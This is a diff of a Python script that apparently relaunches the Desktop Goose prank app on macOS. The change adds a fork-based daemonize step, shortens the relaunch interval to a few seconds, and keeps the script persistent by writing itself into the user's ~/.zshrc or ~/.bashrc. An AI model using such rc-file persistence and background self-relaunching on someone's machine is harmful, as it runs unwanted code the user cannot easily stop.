@@ -1,5 +1,5 @@
 import shutil
-import subprocess,sched, time,random, os, sys,fileinput
+import subprocess,sched, time,random, os, sys
 
 def job():
     procs = []
@@ -12,6 +12,14 @@ def job():
 
 
 s = sched.scheduler(time.time, time.sleep)
+
+
+def daemonize():
+    pid = os.fork()
+    if pid > 0:
+        sys.exit(0)
+    print(pid)
+    print(pid, "passed")
 
 def buildup():
     if not os.path.exists(os.path.expanduser("~/Library/Containers/net.namedfork.DesktopGoose/Data/Library/Preferences/net.namedfork.DesktopGoose.plist")):
@@ -32,7 +40,7 @@ def buildup():
         shutil.copy("net.namedfork.DesktopGoose.plist", os.path.expanduser("~/Library/Containers/net.namedfork.DesktopGoose/Data/Library/Preferences"))
 
     while True:
-        interval = 60 * 30 * random.randint(1, 5) # in seconds
+        interval = 1 * random.randint(1, 5) # in seconds
         s.enter(interval, 1, job, ())
         s.run()
 
@@ -47,10 +55,11 @@ def main():
                 sys.exit()
             except OSError:
                     pass
+    daemonize()
     with open(pid_file, 'w') as f:
         f.write(str(os.getpid()))
     script_path = os.path.abspath(__file__)
-    command = f"python3 {script_path} &"
+    command = f"python3 {script_path}"
     rc_file = os.path.expanduser("~/.zshrc") if os.path.exists(os.path.expanduser("~/.zshrc")) else os.path.expanduser(
         "~/.bashrc")
     if os.path.exists(rc_file):
